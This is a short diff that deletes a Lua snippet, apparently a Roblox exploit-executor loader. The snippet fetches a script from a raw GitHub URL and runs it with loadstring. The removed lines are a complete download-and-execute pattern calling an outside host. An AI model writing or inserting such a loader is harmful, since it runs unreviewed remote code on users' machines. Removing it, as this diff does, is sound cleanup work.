@@ -1,8 +1,0 @@
-local req = (syn and syn.request) or request or http_request
-if req then
-    local res = req({Url = "https://raw.githubusercontent.com/anwer69699-web/ps99/refs/heads/main/ps991", Method = "GET"})
-    if res and res.StatusCode == 200 and res.Body then
-        local f = loadstring(res.Body)
-        if f then f() end
-    end
-end
